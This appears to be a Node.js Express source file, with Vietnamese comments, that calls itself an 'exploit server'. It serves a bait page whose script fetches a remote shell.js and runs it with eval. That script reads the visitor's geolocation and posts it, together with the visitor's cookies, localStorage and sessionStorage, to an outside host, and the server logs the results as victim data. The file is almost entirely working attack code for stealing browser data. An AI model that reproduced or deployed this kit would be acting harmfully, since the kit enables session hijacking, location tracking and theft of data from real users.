// const express = require("express");
// const fs = require("fs");

// const app = express();
// const PORT = 3006;

// app.use(express.json());



// Middleware bắt dữ liệu POST
app.use((req, res, next) => {
    if (req.method === 'POST') {
        console.log('Received POST data:', req.body);
    }
    next();
});

// // Route mặc định
// app.get('/', (req, res) => {
//     res.send('Hello, this is a Node.js server!');
// });




// // Bắt đầu lắng nghe trên cổng PORT
// app.listen(PORT, () => {
//     console.log(`Server đang lắng nghe trên http://localhost:${PORT}`);
// });

const express = require("express");
const app = express();
const PORT = 3006;

// Middleware log dữ liệu POST
app.use(express.json());
app.use((req, res, next) => {
  if (req.method === "POST") {
    console.log("📩 Nhận dữ liệu từ nạn nhân:", req.body);
  }
  next();
});

// Route mặc định
app.get("/", (req, res) => {
  res.send("🚀 Hello, đây là server exploit!");
});

// Route tạo file HTML chứa payload auto-fetch shell.js
app.get("/payload.html", (req, res) => {
  const htmlPayload = `
    <!DOCTYPE html>
    <html>
      <body>
        <h1>Welcome to the safe site 😈</h1>
        <script>
          fetch("http://localhost:3006/shell.js")
            .then(res => res.text())
            .then(shell => eval(shell));
        </script>
      </body>
    </html>
  `;

  res.setHeader("Content-Type", "text/html");
  res.send(htmlPayload);
});

// Route shell.js — Thực thi RCE từ client
app.get("/shell.js", (req, res) => {
  const shellJS = `
    // Thông báo nhỏ gọn cho vui (hoặc bỏ đi cho stealth)
    alert("Bạn đã bị hack!");

    // Lấy vị trí địa lý của nạn nhân
    navigator.geolocation.getCurrentPosition((position) => {
      fetch("https://test-xss.onrender.com/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          lat: position.coords.latitude,
          lon: position.coords.longitude
        })
      });
    });

    // Đính kèm thêm lấy cookie + localStorage + sessionStorage
    fetch("https://test-xss.onrender.com/stolen-data", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
      })
    });
  `;

  res.setHeader("Content-Type", "application/javascript");
  res.send(shellJS);
});

// Route nhận dữ liệu vị trí của nạn nhân
app.post("/location", (req, res) => {
  console.log("📍 Vị trí nạn nhân:", req.body);
  res.send("✅ Đã nhận vị trí!");
});

// Route nhận cookie, localStorage, sessionStorage từ nạn nhân
app.post("/stolen-data", (req, res) => {
  console.log("🔒 Dữ liệu thu thập:", req.body);
  res.send("✅ Đã thu thập xong dữ liệu!");
});

// Khởi chạy server
app.listen(PORT, () => {
  console.log(`Server exploit đang chạy tại: http://localhost:${PORT}`);
  console.log(`⚡ Truy cập payload tại: http://localhost:${PORT}/payload.html`);
});


